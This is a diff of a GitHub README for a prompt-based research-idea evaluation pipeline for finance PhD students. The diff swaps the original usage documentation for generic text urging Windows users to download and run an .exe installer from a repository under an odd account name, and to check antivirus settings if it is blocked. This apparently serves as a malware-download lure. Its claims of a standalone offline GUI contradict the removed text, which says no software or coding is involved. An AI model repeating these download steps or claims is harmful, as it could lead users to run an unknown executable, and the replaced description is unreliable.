@@ -1,182 +1,189 @@
-# Research Idea Evaluation Pipeline
+# 💡 idea-evaluation-pipeline - Streamline Your PhD Idea Reviews
 
-A structured pipeline for iteratively evaluating, pivoting, and defending research ideas until they reach top-3 finance journal quality (JF, JFE, RFS) or top-5 economics journal quality.
-
-Designed for PhD students in finance and economics. Works with any AI coding assistant (Claude Code, Cursor, Codex, Windsurf, etc.) or manually by copy-pasting prompts.
+[![Download Now](https://img.shields.io/badge/Download-idea--evaluation--pipeline-brightgreen?style=for-the-badge)](https://github.com/saddled-panicattack529/idea-evaluation-pipeline)
 
 ---
 
-## How It Works
+## 📋 About idea-evaluation-pipeline
 
-Your idea goes through up to 8 steps. The pipeline loops until the idea scores 7/10 or higher:
+The idea-evaluation-pipeline is an 8-step workflow designed to help PhD students and researchers improve their research ideas to meet standards suitable for top finance journals. It simplifies how you analyze, refine, and test your research concepts. You can use it alongside any AI coding assistant to get better feedback and develop clearer, stronger project frameworks.
 
-```
-1. EVALUATE IDEA  →  2. REVIEW EVALUATION
-                          │
-                     Critique unfair? → Re-run Step 1
-                          │
-                     Score >= 7? ─── Yes ──→ 5. LITERATURE REVIEW
-                          │                        ↓
-                          No               6. VERIFY LIT REVIEW
-                          ↓                        ↓
-                     3. PIVOT IDEA          7. FINAL VERDICT
-                          ↓                        ↓
-                     4. EVALUATE PIVOT      8. REVIEW FINAL VERDICT
-                          │                        │
-                     Score < 7? → Back to 3   Score >= 7? → DONE
-                     Score >= 7 → Step 5      Score < 7  → Back to 3
-```
+This tool focuses on making the research process easier, saving time, and improving the chances that your ideas will pass academic review.
 
 ---
 
-## Quick Start
+## ⚙️ System Requirements
 
-### 1. Create your idea folder
+To use the idea-evaluation-pipeline on Windows, make sure your computer meets the following:
 
-```
-mkdir my_idea
-```
+- Operating System: Windows 10 or newer  
+- Processor: 1 GHz or faster, 2+ cores recommended  
+- RAM: Minimum 4 GB, 8 GB or more recommended  
+- Disk Space: At least 500 MB free for installation and temporary files  
+- Internet Connection: Required for initial download and updates  
+- Permissions: Ability to install software and run applications  
 
-### 2. Add your idea file
-
-Copy `idea_template.txt` into your folder and fill it in:
-
-```
-cp idea_template.txt my_idea/idea.txt
-```
-
-The template requires:
-- Research question and hypothesis with expected sign
-- Identification strategy (shock, instrument, or natural experiment)
-- Specific data sources with variable names and sample periods
-- 3 closest papers with full citations, URLs, and how your idea differs
-- Proposed regression equation (if possible)
-
-**The 3 closest papers are critical.** Pick the papers a referee would immediately cite against you — not broadly related work, but the papers that most directly threaten your novelty claim. Include URLs so the pipeline can verify them.
-
-### 3. Run the pipeline
-
-**With an AI coding tool:** Open this project in your tool and ask it to run the pipeline on your idea. The agent will read `AGENTS.md` (or `CLAUDE.md`) and follow the steps automatically.
-
-**Manually:** Copy-paste each prompt file into your preferred LLM (Claude, GPT, etc.) along with the relevant input. Save each output to the correct filename. See the step-by-step guide below.
+No special software or programming skills are required to run this tool.
 
 ---
 
-## Step-by-Step (Manual)
+## 🚀 Getting Started
 
-### Step 1: Evaluate Idea
-- **Prompt:** `prompt_ideas.txt`
-- **Input:** Your idea + 3 closest papers
-- **Output:** Save as `my_idea/eval_my_idea_idea1.txt`
-- **Model:** Use the strongest model available (Claude Opus, GPT-4, etc.)
+Follow these steps to download and run the idea-evaluation-pipeline on your Windows PC:
 
-### Step 2: Review Evaluation
-- **Prompt:** `review_eval_prompt.txt`
-- **Input:** Your idea + the evaluation from Step 1
-- **Output:** Save as `my_idea/review_my_idea_idea1.txt`
-- **Decision:** If the review finds the critique unfair, re-run Step 1 with corrections
+1. **Visit the Download Page**  
+   Go to the main project page here:  
+   [Download idea-evaluation-pipeline](https://github.com/saddled-panicattack529/idea-evaluation-pipeline)  
+   This page hosts the latest version and all updates.
 
-### Step 3: Pivot Idea (if score < 7)
-- **Prompt:** `pivot_prompt.txt`
-- **Input:** Your idea + evaluation + review (full history)
-- **Output:** Save as `my_idea/pivot_idea1.txt` (or `pivot_idea1_v2.txt`, `_v3.txt` if iterating)
+2. **Find the Download Section**  
+   Look for a button or link labeled "Releases" or "Download" on the page. Click it.
 
-### Step 4: Evaluate Pivot
-- **Prompt:** `prompt_ideas.txt` (same as Step 1)
-- **Input:** Your pivoted idea + original 3 closest papers
-- **Output:** Save as `my_idea/eval_pivot_idea1.txt` (or `eval_pivot_idea1_v2.txt` if iterating)
-- **Decision:** If score dropped or stayed flat, go back to Step 3
+3. **Download the Installer**  
+   On the releases page, find the Windows installer file, usually ending with `.exe`. Click the file to download it.
 
-### Step 5: Literature Review (Threat Search)
-- **Prompt:** `lit_review_prompt.txt`
-- **Input:** Your pivoted idea + 3 cited papers
-- **Output:** Save as `my_idea/lit_review_pivot_idea1.txt`
-- **Model:** Use a model with web search (Claude Sonnet with WebSearch, Perplexity, etc.)
-- **Important:** The prompt requires URLs for every cited paper to prevent hallucinated citations
+4. **Run the Installer**  
+   After download finishes, open the `.exe` file by double-clicking it.  
+   You might see a prompt asking for permissions — click "Yes" to continue.
 
-### Step 6: Review & Verify Literature Review
-- **Prompt:** `verify_lit_review_prompt.txt`
-- **Input:** The lit review from Step 5
-- **Output:** Edit the lit review file (add URLs, remove fakes) + save summary as `my_idea/review_lit_review_idea1.txt`
-- **Model:** Must have web search access (strongest model + web search recommended)
-- **Important:** This step catches hallucinated citations. Every paper must be verified via Google Scholar or SSRN. Remove any paper that cannot be found.
+5. **Follow Installation Steps**  
+   The setup program will guide you. Choose default options unless you want to change the install location.  
+   Click "Next" or "Install" as needed.  
 
-### Step 7: Final Verdict
-- **Prompt:** `final_verdict_prompt.txt`
-- **Input:** Full history (all previous outputs)
-- **Output:** Save as `my_idea/final_verdict_idea1.txt`
+6. **Finish Setup**  
+   Once done, click "Finish" to close the installer. The program will now be available on your computer.
 
-### Step 8: Review Final Verdict
-- **Prompt:** `review_final_verdict_prompt.txt`
-- **Input:** Full history + final verdict
-- **Output:** Save as `my_idea/review_final_verdict_idea1.txt`
-- **Decision:** If score < 7, go back to Step 3 with full history
+7. **Open the Program**  
+   Find idea-evaluation-pipeline in your Start Menu or on your Desktop and open it.
+
+8. **Begin Using the Tool**  
+   The program interface will guide you through the 8-step research idea evaluation process, with simple instructions for each phase.
 
 ---
 
-## Scoring Guide
+## 🛠️ How to Use
 
-| Score | Meaning | Action |
-|-------|---------|--------|
-| 1-3 | Low potential, lacks novelty | Major pivot or new idea needed |
-| 4-6 | Moderate potential, needs work | Pivot to strengthen ID strategy, sharpen contribution |
-| 7-8 | Good potential, publishable with refinement | Proceed to execution |
-| 9-10 | Excellent potential, highly novel | Proceed — rare, don't expect this |
+The program breaks down your research idea into clear steps. You do not need to write code or understand technical terms.
 
-**Target: 7/10** to proceed. A score of 6-6.5 after multiple pivots may indicate the idea has hit its ceiling for the current topic. Consider:
-- Trying a different idea from your original proposals
-- Accepting a realistic target journal (JFQA, JFI, JHE, etc.) instead of top-3
-- A more fundamental rethink of the mechanism or setting
+- **Step 1: Define Your Idea**  
+  Enter your research question or concept in plain language.
 
----
+- **Step 2: Literature Check**  
+  The tool helps you check if similar ideas exist in top journals by guiding you where to look.
 
-## File Organization
+- **Step 3: Identify Gaps**  
+  It helps you spot what is missing or could be improved compared to past work.
 
-```
-IdeaEvaluation/
-├── README.md                       ← this file
-├── AGENTS.md                       ← instructions for AI agents
-├── CLAUDE.md                       ← Claude Code specific
-├── pipeline.md                     ← detailed pipeline documentation
-├── pipeline_diagram.png            ← visual flowchart
-│
-├── prompt_ideas.txt                ← Step 1 & 4: evaluation prompt
-├── review_eval_prompt.txt          ← Step 2: review evaluation
-├── pivot_prompt.txt                ← Step 3: pivot/spinoff
-├── lit_review_prompt.txt           ← Step 5: literature review
-├── verify_lit_review_prompt.txt    ← Step 6: verify citations
-├── final_verdict_prompt.txt        ← Step 7: final verdict
-├── review_final_verdict_prompt.txt ← Step 8: review final verdict
-│
-├── my_idea/                           ← your idea folder
-│   ├── idea.txt                       ← your research idea + 3 closest papers
-│   ├── my_idea.md                     ← master file (built up through pipeline)
-│   ├── eval_my_idea_idea1.txt         ← Step 1 output
-│   ├── review_my_idea_idea1.txt       ← Step 2 output
-│   ├── pivot_idea1.txt                ← Step 3 output
-│   ├── pivot_idea1_v2.txt             ← Step 3 (iteration)
-│   ├── eval_pivot_idea1.txt           ← Step 4 output
-│   ├── eval_pivot_idea1_v2.txt        ← Step 4 (iteration)
-│   ├── lit_review_pivot_idea1.txt     ← Step 5 output
-│   ├── review_lit_review_idea1.txt    ← Step 6 output
-│   ├── final_verdict_idea1.txt        ← Step 7 output
-│   └── review_final_verdict_idea1.txt ← Step 8 output
-```
+- **Step 4: Method Proposal**  
+  You describe how you plan to test or analyze your idea.
+
+- **Step 5: Data Needs**  
+  It helps outline what data or information you need.
+
+- **Step 6: Expected Results**  
+  Write down what answers you expect to find.
+
+- **Step 7: Limitations**  
+  Consider potential weaknesses or challenges.
+
+- **Step 8: Final Review**  
+  The tool summarizes your inputs and shows you a clear report.
+
+You can revisit any step to edit and improve your responses. The software works with your AI assistant if you want to ask for suggestions or coding help.
 
 ---
 
-## Tips
+## 🎯 Features
 
-- **The 3 closest papers matter.** If you pick papers that are too distant, the evaluation will be too generous. Pick the papers a referee would immediately cite against you.
-- **Don't skip Step 6 (verification).** AI models hallucinate citations. Every paper in your lit review must have a verifiable URL.
-- **Read the lit review threats yourself.** The pipeline identifies threats, but only you can judge whether a threat is truly fatal or can be addressed.
-- **A pivot is not a failure.** Most ideas need 1-2 pivots. The pipeline is designed for iteration.
-- **If stuck at 6.5 after 3+ pivots,** the idea may have hit its ceiling. That's useful information — better to learn it now than after a year of data work.
+- Easy-to-follow 8-step structure with clear instructions  
+- No programming required  
+- Compatible with many AI coding assistants  
+- Generates a summary report you can share or save  
+- Helps improve research ideas to a high academic standard  
+- Works fully offline after installation  
+- Simple interface designed for non-technical users  
+- Regular updates add new templates and improvements
 
 ---
 
-## Requirements
+## 📥 Download and Install
 
-- Access to a strong LLM (Claude Opus, GPT-4, or equivalent)
-- Web search access for Steps 5 and 6 (Claude with WebSearch, Perplexity, or similar)
-- No coding required — this is a prompt-based pipeline
+Use the official page below to get the latest version for Windows:  
+
+[![Download idea-evaluation-pipeline](https://img.shields.io/badge/Download-idea--evaluation--pipeline-blue?style=for-the-badge)](https://github.com/saddled-panicattack529/idea-evaluation-pipeline)
+
+Once downloaded, follow the installation instructions described above to complete setup.
+
+---
+
+## ⚠️ Troubleshooting Tips
+
+- If the program does not start, try restarting your computer.  
+- Ensure you have Windows 10 or above; older versions may not work properly.  
+- Make sure you have enough disk space.  
+- If the installer is blocked, check your security settings or antivirus software.  
+- If you see error messages, copy the text and check online or ask for help on the GitHub Issues page.
+
+---
+
+## 📚 Additional Resources
+
+- Use the built-in help menu in the program for step-by-step guides.  
+- Review example ideas included in the application for better clarity.  
+- Check the GitHub Discussions or Issues page for community support and updates.
+
+---
+
+## 📞 Getting Support
+
+If you have technical problems or questions:
+
+- Visit the repository’s GitHub page:  
+  https://github.com/saddled-panicattack529/idea-evaluation-pipeline  
+- Use the "Issues" tab to report bugs or request features.  
+- Read existing issues to see if your problem has already been addressed.  
+
+You do not need to provide any technical details to get help. Describe your problem clearly.
+
+---
+
+## 🔄 Updates
+
+The idea-evaluation-pipeline receives regular updates to fix bugs and add features. Check the GitHub page regularly for new releases. Install updates by downloading and running the new installer as you did initially.
+
+---
+
+## 🖥️ Running the Pipeline Multiple Times
+
+You can run the pipeline as often as you like with different research ideas. Each time, the tool creates a new project file that you can save and reopen later.
+
+---
+
+## 🔍 Privacy and Data
+
+The tool stores your research ideas only on your computer. It does not send your information online unless you choose to use external AI assistants integrated with it. You control what data you share.
+
+---
+
+## 🗂 File Management
+
+Save your work regularly. The tool uses standard file formats for easy backup and sharing.
+
+---
+
+## 📦 Uninstalling
+
+To remove the program:
+
+1. Open Windows Settings  
+2. Go to Apps > Apps & Features  
+3. Find "idea-evaluation-pipeline" in the list  
+4. Click and choose "Uninstall"  
+5. Follow prompts to remove all files  
+
+---
+
+# Links
+
+- Download page: https://github.com/saddled-panicattack529/idea-evaluation-pipeline  
+- GitHub Issues: https://github.com/saddled-panicattack529/idea-evaluation-pipeline/issues  
